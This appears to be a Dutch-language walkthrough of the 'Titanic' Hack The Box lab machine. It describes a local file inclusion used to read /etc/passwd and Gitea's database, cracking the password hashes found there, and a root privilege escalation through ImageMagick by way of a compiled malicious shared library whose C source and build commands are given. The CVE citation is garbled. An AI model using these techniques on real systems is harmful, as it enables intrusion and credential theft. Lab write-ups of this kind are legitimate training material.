# Titanic

Zink tijd, op de website is er zo te zien maar 1 interactie mogelijk en dat is
het boeken van een trip. Een call wordt hierbij gedaan waarna er een redirect is
naar `/download?ticket=123.json`. Een snelle check met `/etc/passwd` toont dat
we hier een file inclusion mogelijkheid hebben.

Met een wat fuzzy-finding vinden we een hele stapel files die we kunnen
downloaden om wat beter te bekijken. In de hosts file zien we in ieder geval een
`dev.titanic.htb` domein waar een _gittea_ applicatie op draait.

# Gittea

We hebben LFI en via de git commits die we kunnen inzien weten we dat de `gitea`
data folder is gemount op `/home/developer/gitea/data`. Combineer die twee en we
kunnen de configuratie van gittea uitlezen en ook waar de DB staat.

Met de DB kunnen we de password hashes voor de `developer` en `administrator`
user, deze moeten nog wel rechtgetrokken worden en daar is gelukkig wat uitleg
voor te vinden op:

- [hashcat forum](https://hashcat.net/forum/thread-8391-post-44775.html#pid44775)
- [0xdf](https://0xdf.gitlab.io/2024/12/14/htb-compiled.html#)

Hiermee hebben we de inlog van de developer user te pakken, zie
[users](./users.md). Hiermee kunnen we niet alleen inloggen op de gittea
omgeving maar kan ook gebruikt worden voor SSH.

# Privesc

Met `netstat -tunlp` zien we een proces draaien op poort `37749`, een snelle
curl toont dat dit een webserver is van "iets". Alles wat ik probeer qua fuzzing
komt uit op een 404.

Met verder zoeken op de server kom ik wel het volgende tegen:
- Een docker-compose voor mysql maar er draait geen mysql
- docker draait wel maar geen rechten
    - Mogelijke exploit via gitea? SSH is open op poort 2222 maar krijg
      public-key denied :/
- /opt/scripts klinkt gek, waarom staat dit hier?

## Imagemagick

Na veel rondzoeken maar gezocht op de tools die vanuit het `scripts` bestand
draaien. Hier staat image magick in die schijnbaar vatbaar is voor een RCE. Met
de volgende payload krijgen we een `root` user

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("whoami >> /tmp/fff/whoami.txt");
    exit(0);
}
```

```bash
# Compileer met
gcc -x c -shared -fPIC -o ./libxcb.so.1 payload.c

# Drop in
cp libxcb.so.1 /opt/app/static/assets/images
```

> Gebaseerd op [deze cve](developer@titanic:/tmp/fff$ gcc -x c -shared -fPIC -o
> ./libxcb.so.1 payload.c)

Hiermee zie ik uiteindelijk wel een `whoami.txt` verschijnen met daarin de
`root` user. Dit is dus de privesc. Tijd om dit om te zetten naar een
fatsoenlijke RCE want nu wil ik ook weten wat die poort 37749 is.

De payload verder uitbreiden met een revshell en we hebben een root login. Op
poort 37749 draait schijnbaar `containerd`.
